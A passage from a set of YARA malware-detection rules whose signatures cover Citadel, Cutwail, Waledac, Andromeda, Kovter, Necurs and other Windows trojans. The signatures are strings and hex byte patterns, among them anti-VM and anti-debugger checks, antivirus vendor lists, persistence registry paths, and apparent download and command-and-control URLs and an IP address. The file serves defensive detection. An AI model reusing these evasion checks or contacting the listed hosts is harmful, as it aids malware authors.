$ = "CLOSE MP3" ascii wide
$ = "VIRTUALBOX" ascii wide
$ = "VideoBiosVersion" ascii wide
$ = "QEMU" ascii wide
$ = "VMWARE" ascii wide
$ = "VBOX" ascii wide
$ = "VIRTUAL" ascii wide
$ = "taskmgr.exe" ascii wide
$ = "explorer.exe" ascii wide
$ = "Program Manager" ascii wide
$ = "Shell_TrayWnd" ascii wide
$ = "FriendlyName" ascii wide
$ = "Capture Filter" ascii wide
$ = "SampleGrab" ascii wide
$ = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer" ascii wide
$ = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
$ = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot" ascii wide
$ = "Hello, visitor from: <strong>" ascii wide
$ = "SendVoucher" ascii wide
$ = "winver" ascii wide
$ = "AVID" ascii wide
$ = "Emsisoft" ascii wide
$ = "Lavasoft" ascii wide
$ = "avast" ascii wide
$ = "Avira" ascii wide
$ = "BitDef" ascii wide
$ = "COMODO" ascii wide
$ = "F-Secure" ascii wide
$ = "G Data" ascii wide
$ = "Kaspersky" ascii wide
$ = "McAfee" ascii wide
$ = "ESET" ascii wide
$ = "Norton" ascii wide
$ = "Microsoft Security Essentials" ascii wide
$ = "Panda" ascii wide
$ = "Sophos" ascii wide
$ = "Trend Micro" ascii wide
$ = "Symantec" ascii wide
$ = "BullGuard" ascii wide
$ = "VIPRE" ascii wide
$ = "Webroot" ascii wide
condition:
8 of them
}rule SSC_TrojanChangeStartPageSampleA
{
meta:
Description  = "Trojan.CStartPage.sm"
ThreatLevel  = "5"
strings:
$ = "chrome.exe" ascii wide
$ = "urls_to_restore_on_startup" ascii wide
$ = "restore_on_startup" ascii wide
$ = "restore_on_startup_migrated" ascii wide
$ = "urls_to_restore_on_startup" ascii wide
$ = "translate_accepted_count" ascii wide
$ = "translate_denied_count" ascii wide
$ = "translate_site_blacklist" ascii wide
$ = "netsh firewall add allowedprogram" ascii wide
$ = "homepage_is_newtabpage" ascii wide
$ = "Start Page" ascii wide
$ = "user_pref(%cbrowser.startup.homepage%c" ascii wide
$ = "%ws\\mozilla\\firefox\\profiles" ascii wide
$ = "c:\\windows\\sms.exe" ascii wide
condition:
3 of them
}
rule SSC_TrojanWin32CitadelSampleA
{
meta:
Description  = "Trojan.Citadel.sm"
ThreatLevel  = "5"
strings:
$a = "Coded by BRIAN KREBS for personal use only. I love my job & wife." ascii wide
$hex_string = {85 C0 7? ?? 8A 4C 30 FF 30 0C 30 48 7?}
$ = "softpc.new" ascii wide
$ = "CS:%04x IP:%04x OP:%02x %02x %02x %02x %02x" ascii wide
condition:
any of them
}rule SSC_TrojanWin32ComfooSample
{
meta:
Description  = "Trojan.Comfoo.sm"
ThreatLevel  = "5"
strings:
$ = "exclusiveinstance12" ascii wide
$ = "MYGAMEHAVESTART" ascii wide
$ = "MYGAMEHAVEstarted" ascii wide
$ = "MYGAMEHAVESTARTEd" ascii wide
$ = "MYGAMEHAVESTARTED" ascii wide
$ = "thisisanewfirstrun" ascii wide
$ = "THISISASUPERNEWGAMENOWBEGIN" ascii wide
$ = "thisisnewtrofor024" ascii wide
$ = "cabinet.dll" ascii wide
$ = "09lkjds" ascii wide
$ = "perfdi.ini" ascii wide
$ = "msobj.sys" ascii wide
$ = "usbak.sys" ascii wide
$ = "\\\\.\\DevCtrlKrnl" ascii wide
$ = "THIS324NEWGAME" ascii wide
$ = "watchevent29021803" ascii wide
$ = "iamwaitingforu653890" ascii wide
$ = "Call to GetAdaptersInfo failed. Return Value" ascii wide
$ = "Hard Disk(%s--LocalDisk)" ascii wide
$ = "Total size: %I64d (MB)" ascii wide
$ = "SYSTEM\\CurrentControlSet\\Services\\%s" ascii wide
$hex0 = { 6a ff 68 1b 04 01 10 64 ?? ?? ?? ?? ?? 50 64 ?? ?? ?? ?? ?? ?? 51 56 57 68 30 17 00 00 e8 ?? ?? ?? ?? 83 c4 04 89 ?? ?? ?? 85 c0 c7 ?? ?? ?? ?? ?? ?? ?? 74 ?? 8b c8 e8 ?? ?? ?? ?? 8b f0 eb ?? 33 f6 8b ?? 6a 01 8b ce c7 ?? ?? ?? ?? ?? ?? ?? ff ?? ?? bf 30 3b 01 10 83 c9 ff 33 c0 8b ?? f2 ?? f7 d1 49 51 68 30 3b 01 10 8b ce ff ?? ?? 8b ?? 68 81 3e 00 00 8b ce ff ?? ?? 8b ?? ?? ?? 8b ?? 50 8b ce ff ?? ?? 8b ?? ?? ?? 8b ?? 50 8b ce ff ?? ?? 56 e8 ?? ?? ?? ?? 8b f8 83 c4 04 f7 df 1b ff 47 85 f6 74 ?? 8b ce e8 ?? ?? ?? ?? 56 e8 ?? ?? ?? ?? 83 c4 04 8b ?? ?? ?? 8b c7 5f 5e 64 ?? ?? ?? ?? ?? ?? 83 c4 10 c3}
$hex1 = { 55 56 57 6a 08 33 ed e8 ?? ?? ?? ?? 8b f0 83 c4 04 85 f6 0f ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 89 ?? ff ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 68 7f 03 0f 00 55 68 94 32 01 10 89 ?? ?? ff ?? ?? ?? ?? ?? 8b f8 85 ff 74 ?? 53 57 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 68 ff 01 0f 00 55 55 68 e8 30 01 10 ff ?? ?? ?? ?? ?? 8b d8 85 db 74 ?? 53 ff ?? ?? ?? ?? ?? 85 c0 74 ?? bd 01 00 00 00 53 ff ?? ?? ?? ?? ?? 57 ff ?? ?? ?? ?? ?? 85 ed 5b 74 ?? 8b c6 5f 5e 5d c3}
$hex2 = { 53 53 6a 03 53 53 68 00 00 00 c0 68 78 33 01 10 ff ?? ?? ?? ?? ?? 89 ?? ?? 83 f8 ff 75 ?? 33 c0 8b ?? ?? 64 ?? ?? ?? ?? ?? ?? 5f 5e 5b 8b e5 5d c3 89 ?? ?? 89 ?? ?? 89 ?? ?? be 88 33 01 10 8b c7 8a ?? 8a ca 3a ?? 75 ?? 3a cb 74 ?? 8a ?? ?? 8a ca 3a ?? ?? 75 ?? 83 c0 02 83 c6 02 3a cb 75 ?? 33 c0 eb ?? 1b c0 83 d8 ff 3b c3 75 ?? 89 ?? ?? eb ?? 57 ff ?? ?? ?? ?? ?? 89 ?? ?? 83 f8 ff 74 ?? 8b ?? ?? 50 ff ?? ?? ?? ?? ?? 66 ?? ?? ?? 53 8d ?? ?? 51 6a 04 8d ?? ?? 52 6a 06 8d ?? ?? 50 8b ?? ?? 56 8b ?? ?? 51 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 81 fe c8 20 22 00 75 ?? c7 ?? ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 8b ?? ?? 8b ?? ?? 64 ?? ?? ?? ?? ?? ?? 5f 5e 5b 8b e5 5d c3}
condition:
(3 of them) or (any of ($hex*))
}rule SSC_TrojanBotnetWin32CutwailSample
{
meta:
Description  = "Trojan.Cutwail.sm"
ThreatLevel  = "5"
strings:
$ = "PreLoader.pdb" ascii wide
$ = "magadan21"  ascii wide
$ = "RkInstall.pdb"  ascii wide
$ = "InnerDrv.pdb"    ascii wide
$ = "Protect.pdb" ascii wide
$ = "MailerApp.pdb" ascii wide
$ = "revolution6" ascii wide
$ = "bot25" ascii wide
condition:
any of them
}rule SSC_TrojanDllpatcherA
{
meta:
Description = "Trojan.Dllpatcher.vb"
ThreatLevel = "5"
strings:
$str1 = "Global\\Matil da"  ascii wide
$str2 = "Global\\Nople Mento"  ascii wide
$str3 = "%s\\System32\\dnsapi.dll"  ascii wide
$str4 = "%s\\SysWOW64\\dnsapi.dll"  ascii wide
condition:
3 of them
}
rule SSC_TrojanDownloaderWin32KaraganySampleA
{
meta:
Description  = "Trojan.Karagany.sm"
ThreatLevel  = "5"
strings:
$hex0 = { e8 ?? ?? ?? ?? 68 b4 05 00 00 e8 ?? ?? ?? ?? 83 c4 04 c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? ff ?? ?? 99 b9 05 00 00 00 f7 f9 89 ?? ?? ?? ?? ?? 83 ?? ?? ?? ?? ?? ?? 75 ?? 68 c0 24 40 00 8b ?? ?? ?? ?? ?? 52 ff ?? ?? ?? ?? ?? 83 c4 08 eb ?? 83 ?? ?? ?? ?? ?? ?? 75 ?? 68 78 24 40 00 a1 ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 83 c4 08 eb ?? 83 ?? ?? ?? ?? ?? ?? 75 ?? 68 30 24 40 00 8b ?? ?? ?? ?? ?? 51 ff ?? ?? ?? ?? ?? 83 c4 08 eb ?? 83 ?? ?? ?? ?? ?? ?? 75 ?? 68 e8 23 40 00 8b ?? ?? ?? ?? ?? 52 ff ?? ?? ?? ?? ?? 83 c4 08 eb ?? 83 ?? ?? ?? ?? ?? ?? 75 ?? 68 a0 23 40 00 a1 ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 83 c4 08 8d ?? ?? ?? ?? ?? 51 68 00 03 00 84 6a 00 6a 00 8b ?? ?? ?? ?? ?? 52 8b ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 83 ?? ?? ?? ?? ?? ?? 74 ?? 83 ?? ?? ?? ?? ?? ??}
$hex1 = { 55 8b ec 83 ec 18 e8 ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 04 a3 ?? ?? ?? ?? 68 d0 21 40 00 8b ?? ?? 51 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? 6a 00 6a 00 68 38 23 40 00 ff ?? ?? ?? ?? ?? 89 ?? ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c2 01 89 ?? ?? 83 ?? ?? ?? 73 ?? 8b ?? ?? 8b ?? ?? ?? ?? ?? ?? 51 8b ?? ?? 52 ff ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? ?? eb ?? 6a 00 6a 00 68 2c 23 40 00 ff ?? ?? ?? ?? ?? 89 ?? ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c2 01 89 ?? ?? 83 ?? ?? ?? 73 ?? 8b ?? ?? 8b ?? ?? ?? ?? ?? ?? 51 8b ?? ?? 52 ff ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? ?? eb ?? 6a 00 6a 00 68 20 23 40 00 ff ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 52 8b ?? ?? 50 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 51 8b ?? ?? 52 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? a1 ?? ?? ?? ?? 50 8b ?? ?? 51 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? 6a 00 6a 00 68 14 23 40 00 ff ?? ?? ?? ?? ?? 89 ?? ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c2 01 89 ?? ?? 83 ?? ?? ?? 73 ?? 8b ?? ?? 8b ?? ?? ?? ?? ?? ?? 51 8b ?? ?? 52 ff ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? ?? eb ?? 6a 00 6a 00 68 04 23 40 00 ff ?? ?? ?? ?? ?? 89 ?? ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c2 01 89 ?? ?? 83 ?? ?? ?? 73 ?? 8b ?? ?? 8b ?? ?? ?? ?? ?? ?? 51 8b ?? ?? 52 ff ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? ?? eb ?? 8b e5 5d c3}
$hex2 = { 55 8b ec 81 ec 20 04 00 00 a1 ?? ?? ?? ?? 89 ?? ?? 68 e0 30 40 00 68 48 23 40 00 8d ?? ?? ?? ?? ?? 51 ff ?? ?? 83 c4 0c 6a 00 6a 00 8d ?? ?? ?? ?? ?? 52 e8 ?? ?? ?? ?? 83 c4 0c b8 01 00 00 00 8b e5 5d c3}
condition:
any of ($hex*)
}
rule SSC_TrojanDownloaderWin32WaledacSampleR
{
meta:
Description  = "Trojan.Waledac.sm"
ThreatLevel  = "5"
strings:
$hex0 = { 55 8b ec 81 ec 6c 02 00 00 56 57 68 80 00 00 00 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 68 1c 21 40 00 8d ?? ?? ?? ?? ?? 50 ff d6 e8 ?? ?? ?? ?? 8d ?? ?? 51 50 e8 ?? ?? ?? ?? 8b ?? ?? 59 59 8b ?? ?? 8d ?? ?? ?? 50 8d ?? ?? ?? ?? ?? 50 ff d6 8d ?? ?? 50 e8 ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? 50 ff d6 33 f6 56 56 6a 02 56 56 68 00 00 00 40 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 8b f8 3b fe 75 ?? 32 c0 eb ?? 56 8d ?? ?? 50 53 ff ?? ?? 57 ff ?? ?? ?? ?? ?? 57 ff ?? ?? ?? ?? ?? 39 ?? ?? 75 ?? 6a 44 5f 57 8d ?? ?? 56 50 e8 ?? ?? ?? ?? 83 c4 0c 33 c0 66 ?? ?? ?? 8d ?? ?? 50 8d ?? ?? 50 56 56 56 56 56 56 8d ?? ?? ?? ?? ?? 50 56 89 ?? ?? c7 ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? f7 d8 1b c0 f7 d8 5f 5e c9 c3 55}
$hex1 = { 55 8b ec 83 e4 f8 83 ec 10 56 57 e8 ?? ?? ?? ?? be 10 30 40 00 56 68 02 02 00 00 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 56 6a 02 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 56 68 01 01 00 00 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 6a ff ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? a3 ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? be 30 21 40 00 8d ?? ?? ?? a5 a5 59 a3 ?? ?? ?? ?? a5 8d ?? ?? ?? 50 68 40 21 40 00 a4 e8 ?? ?? ?? ?? 59 59 84 c0 75 ?? 8d ?? ?? ?? 50 68 4c 21 40 00 e8 ?? ?? ?? ?? 59 59 ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 59 ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 59 5f 33 c0 5e 8b e5 5d c3}
$hex2 = { 55 8b ec 51 83 ?? ?? ?? 53 8b ?? ?? ?? ?? ?? 56 57 bf 00 90 01 00 eb ?? 7c ?? 8b ?? ?? 56 ff ?? ?? ?? ?? ?? 03 c3 50 e8 ?? ?? ?? ?? 01 ?? ?? 8b ?? ?? 8b ?? ?? 83 c4 0c e8 ?? ?? ?? ?? 83 e8 00 74 ?? 48 75 ?? 6a 00 57 ff ?? ?? ?? ?? ?? ff ?? ?? ff ?? ?? ?? ?? ?? 8b f0 85 f6 75 ?? 8b ?? ?? 8b ?? ?? e8 ?? ?? ?? ?? f7 d8 1b c0 40 eb ?? 48 32 c0 eb ?? b0 01 5f 5e 5b c9 c3}
condition:
any of ($hex*)
}
rule SSC_TrojanDownloaderWin32PerkeshSamle
{
meta:
Description  = "Trojan.Perkesh.rc"
ThreatLevel  = "5"
strings:
$a = "698d51" ascii wide
$b = "%s~%x.dat" ascii wide
$c = "\\drivers\\etc\\hosts" ascii wide
condition:
all of them
}
rule SSC_TrojanDownloaderWin32PerkeshDriverSamle
{
meta:
Description  = "Trojan.Perkesh.rc"
ThreatLevel  = "5"
strings:
$a = "C:\\FOUND.001\\333888\\sys\\Driver\\i386\\feiji.pdb" ascii wide
condition:
$a
}
rule SSC_TrojanDropperMicrojoin
{
meta:
Description  = "Trojan.Microjoin.rc"
ThreatLevel  = "5"
strings:
$ep = { 55 8B EC 6A FF 68 00 00 00 00 68 00 00 00 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68 53 56 57 5F 5E 5B 33 C0 83 C4 78 5D }
condition:
$ep at pe.entry_point
}rule SSC_TrojanDownloaderWin32Frethog_E_Sample
{
meta:
Description  = "Trojan.Frethog.sm"
ThreatLevel  = "5"
strings:
$ = "C:\\WINDOWS\\system32\\msvbvm60.dll\\3" ascii wide
$ = "DownLoad File:" ascii wide
$ = "\\system32\\mswinsck.ocx" ascii wide
$ = "http://www.pc918.net/file.txt" ascii wide
$ = "http://www.yswm.net/file.txt" ascii wide
$ = "http://www.v138.net/file.txt" ascii wide
$ = "http://www.v345.net/file.txt" ascii wide
$ = "http://www.ahwm.net/file.txt" ascii wide
$ = "http://user.yswm.net/yswm" ascii wide
$ = "so118config" ascii wide
$ = "http://user.yswm.net" ascii wide
$ = "hide.exe" ascii wide
$ = "\\win.ini" ascii wide
$ = "\\system32\\svchost.exe" ascii wide
$ = "P2P DownFile:" ascii wide
$ = "yswm.runsoft" ascii wide
$ = "\\sys.dat" ascii wide
condition:
4 of them
}rule SSC_TrojanGBotSampleA_Malex
{
meta:
Description  = "Trojan.GBot.sm"
ThreatLevel  = "5"
strings:
$ = "My name is \"G-Bot\" or \"GBot\"!"ascii wide
$ = "C:\\WINDOWS\\WinUpdaterstd\\svchost.exe"ascii wide
$hex0 = { 85 d2 74 ?? 8b ?? ?? 41 7f ?? 50 52 8b ?? ?? e8 ?? ?? ?? ?? 89 c2 58 52 8b ?? ?? e8 ?? ?? ?? ?? 5a 58 eb ?? f0 ?? ?? ?? 87 ?? 85 d2 74 ?? 8b ?? ?? 49 7c ?? f0 ?? ?? ?? 75 ?? 8d ?? ?? e8 ?? ?? ?? ?? c3}
$hex1 = { 53 56 8b f2 8b d8 66 ?? ?? ?? 66 3d b0 d7 72 ?? 66 3d b3 d7 76 ?? bb 66 00 00 00 eb ?? 66 3d b0 d7 74 ?? 8b c3 e8 ?? ?? ?? ?? 66 ?? ?? ?? 80 ?? ?? ?? 75 ?? 83 ?? ?? ?? 75 ?? c7 ?? ?? ?? ?? ?? ?? 8b c3 ff ?? ?? 8b d8 85 db 74 ?? 8b c3 e8 ?? ?? ?? ?? 8b c3 5e 5b c3}
condition:
any of them
}rule SSC_TrojanDropperWin32Gamarue_A_Andromeda
{
meta:
Description  = "Trojan.Andromeda.sm"
ThreatLevel  = "5"
strings:
$ = { 66 8B 10 66 3B 11 75 1E 66 3B D3 74 15 66 8B 50 02 66 3B 51 02 75 0F 83 C0 04 83 C1 04 66 3B D3 75 DE 33 C0 EB 05 1B C0 83 D8 FF 3B C3 0F 84 ?? ?? ?? ?? 8D 85 ?? ?? ?? ?? ?? 56 FF D7 85 C0 75 ?? }
$a = "ldr\\CUSTOM\\local\\local\\Release\\ADropper.pdb" ascii wide
$ = "EpisodeNorth.exe" ascii wide
$ = "HandballChampionship.exe" ascii wide
$ = "\\#MSI" ascii wide
$ = "\\MSI" ascii wide
$ = "\\msiexec.exe" ascii wide
$ = "avp.exe" ascii wide
$ = "\\(empty).lnk" ascii wide
$b = "hsk\\ehs\\dihviceh\\serhlsethntrohntcohurrehem\\chsyst" ascii wide
condition:
(3 of them) or $a or $b
}
rule SSC_TrojanInjectorA
{
meta:
Description = "Trojan.Injector.vb"
ThreatLevel = "5"
strings:
$ = "KERNEO32.nll"  ascii wide
$ = "CfeateFileAaocwwA"  ascii wide
$ = "RGPdFileREjhsoX"  ascii wide
condition:
all of them
}
rule SSC_TrojanWin32KovterSample
{
meta:
Description  = "Trojan.Kovter.sm"
ThreatLevel  = "5"
strings:
$ = "AntiVirtualBox" ascii wide
$ = "AntiVMware" ascii wide
$ = "AntiVMwareEx" ascii wide
$ = "AntiVirtualPC" ascii wide
$ = "AntiSandboxie" ascii wide
$ = "AntiThreadExpert" ascii wide
$ = "AntiWireshark" ascii wide
$ = "AntiJoeBox" ascii wide
$ = "AntiRFP" ascii wide
$ = "AntiAllDebugger" ascii wide
$ = "AntiODBG" ascii wide
$ = "AntiSoftIce" ascii wide
$ = "AntiSyserDebugger" ascii wide
$ = "AntiTrwDebugger" ascii wide
$ = "AntiVirtualMachine" ascii wide
$ = "AntiSunbeltSandboxie" ascii wide
$a = "i:\\MySoft\\project Locker\\optimize orig Binary\\kol\\err.pas" ascii wide
condition:
3 of them or $a
}rule SSC_TrojanDownloaderWin32KuluozSampleB
{
meta:
Description  = "Trojan.Asprox.sm"
ThreatLevel  = "5"
strings:
$ = "svchost.exe" ascii wide
$ = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
$ = "/index.php?r=gate&id=" ascii wide
$ = "/index.php?r=gate/getipslist&id=" ascii wide
$ = "You fag" ascii wide
$ = "For group" ascii wide
$hex0 = { 55 8b ec 81 ec dc 00 00 00 90 68 1c 10 40 00 ff ?? ?? ?? ?? ?? 89 ?? ?? 68 28 10 40 00 8b ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 68 44 10 40 00 8b ?? ?? 51 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 68 58 10 40 00 8b ?? ?? 52 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 68 6c 10 40 00 8b ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 68 7c 10 40 00 8b ?? ?? 51 ff ?? ?? ?? ?? ?? 89 ?? ?? 68 94 10 40 00 8b ?? ?? 52 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? b8 50 89 40 00 2d b0 10 40 00 89 ?? ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c1 01 89 ?? ?? 83 ?? ?? ?? 73 ?? 8b ?? ?? c6 ?? ?? ?? ?? ?? ?? ?? eb ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c0 01 89 ?? ?? 83 ?? ?? ?? 73 ?? 8b ?? ?? c6 ?? ?? ?? ?? eb ?? c7 ?? ?? ?? ?? ?? ?? 90 8d ?? ?? ?? ?? ?? 52 8d ?? ?? 50 6a 00 6a 00 6a 04 6a 00 6a 00 6a 00 68 a4 10 40 00 6a 00 ff ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 6a 00 6a 18 8d ?? ?? 50 6a 00 8b ?? ?? ?? ?? ?? 51 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? 83 c2 08 89 ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 6a 04 8d ?? ?? ?? ?? ?? 51 8b ?? ?? ?? ?? ?? 52 8b ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 6a 00 68 00 00 00 08 6a 40 8d ?? ?? ?? ?? ?? 52 6a 00 68 1f 00 0f 00 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? 6a 40 6a 00 6a 01 8d ?? ?? ?? ?? ?? 52 6a 00 6a 00 6a 00 8d ?? ?? ?? ?? ?? 50 6a ff 8b ?? ?? 51 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c2 01 89 ?? ?? 8b ?? ?? 3b ?? ?? 73 ?? b9 b0 10 40 00 03 ?? ?? 8b ?? ?? ?? ?? ?? 03 ?? ?? 8a ?? 88 ?? eb ?? 90 c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 6a 40 6a 00 6a 01 8d ?? ?? ?? ?? ?? 51 6a 00 6a 00 6a 00 8d ?? ?? ?? ?? ?? 52 8b ?? ?? ?? ?? ?? 50 8b ?? ?? 51 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 6a 40 68 00 30 00 00 68 00 00 50 00 6a 00 ff ?? ?? ?? ?? ?? 89 ?? ?? 8d ?? ?? ?? ?? ?? 50 68 00 10 00 00 8b ?? ?? 51 8b ?? ?? ?? ?? ?? 52 8b ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? 8b ?? ?? 03 ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 51 8b ?? ?? 52 8b ?? ?? 50 8b ?? ?? ?? ?? ?? 51 8b ?? ?? ?? ?? ?? 52 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 6a 00 68 00 00 00 08 6a 40 8d ?? ?? ?? ?? ?? 51 6a 00 68 1f 00 0f 00 8d ?? ?? ?? ?? ?? 52 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 6a 40 6a 00 6a 01 8d ?? ?? ?? ?? ?? 51 6a 00 6a 00 6a 00 8d ?? ?? ?? ?? ?? 52 6a ff 8b ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? 03 ?? ?? ?? ?? ?? c6 ?? ?? 8b ?? ?? 03 ?? ?? ?? ?? ?? c6 ?? ?? ?? 8b ?? ?? 03 ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? 8b ?? ?? 03 ?? ?? ?? ?? ?? c6 ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? eb ?? 8b ?? ?? 83 c0 01 89 ?? ?? 8b ?? ?? 3b ?? ?? 73 ?? 8b ?? ?? ?? ?? ?? 03 ?? ?? 8b ?? ?? 03 ?? ?? 8a ?? 88 ?? eb ?? 90 8b ?? ?? ?? ?? ?? 52 8b ?? ?? ?? ?? ?? 50 ff ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 6a 40 6a 00 6a 01 8d ?? ?? ?? ?? ?? 50 6a 00 6a 00 6a 00 8d ?? ?? ?? ?? ?? 51 8b ?? ?? ?? ?? ?? 52 8b ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 6a 00 8b ?? ?? ?? ?? ?? 51 ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 68 e8 03 00 00 ff ?? ?? ?? ?? ?? 6a 00 ff ?? ?? ?? ?? ?? 8b e5 5d c3}
condition:
(3 of them) or $hex0
}rule SSC_TrojanWin32LethicBSample
{
meta:
Description  = "Trojan.Lethic.sm"
ThreatLevel  = "5"
strings:
$ = "zaproxza" ascii wide
$ = "93.190.137.51" ascii wide
$ = "antaw" ascii wide
$hex0 = { e8 ?? ?? ?? ?? 8b ?? ?? 52 e8 ?? ?? ?? ?? 8b ?? ?? 50 e8 ?? ?? ?? ?? 68 74 43 40 00 e8 ?? ?? ?? ?? 89 ?? ?? 6a 33 68 00 40 40 00 8b ?? ?? 51 e8 ?? ?? ?? ?? 8b ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? 83 ?? ?? ?? ?? ?? ?? 75 ?? e9 ?? ?? ?? ?? 8b ?? ??}
condition:
(2 of them) or (any of ($hex*))
}rule SSC_TrojanWin32NecursSample
{
meta:
Description  = "Trojan.Necurs.sm"
ThreatLevel  = "5"
strings:
$ = "some stupid error %u" ascii wide
$ = "loading" ascii wide
$ = "unloading" ascii wide
$ = "exception %08x %swhen %s at %p" ascii wide
$ = "microsoft.com" ascii wide
$ = "facebook.com" ascii wide
$a = "NitrGB" ascii wide
$ = "\\Installer\\{" ascii wide
$ = "%s%0.8X-%0.4X-%0.4X-%0.4X-%0.8X%0.4X}\\" ascii wide
$ = "syshost32" ascii wide
$ = "%s\\svchost.exe" ascii wide
condition:
(8 of them) or $a
}
rule SSC_TrojanWinNTNecursSample
{
meta:
Description  = "Trojan.Necurs.sm"
ThreatLevel  = "5"
strings:
$a = "F:\\cut\\abler\\detecting\\overlapping\\am.pdb" ascii wide
$ = "VirusBuster Ltd" ascii wide
$ = "Beijing Jiangmin" ascii wide
$ = "SUNBELT SOFTWARE" ascii wide
$ = "Sunbelt Software" ascii wide
$ = "K7 Computing" ascii wide
$ = "Immunet Corporation" ascii wide
$ = "Beijing Rising" ascii wide
$ = "G DATA Software" ascii wide
$ = "Quick Heal Technologies" ascii wide
$ = "Comodo Security Solutions" ascii wide
$ = "CJSC Returnil Software" ascii wide
$ = "NovaShield Inc" ascii wide
$ = "BullGuard Ltd" ascii wide
$ = "Check Point Software Technologies Ltd" ascii wide
$ = "Panda Software International" ascii wide
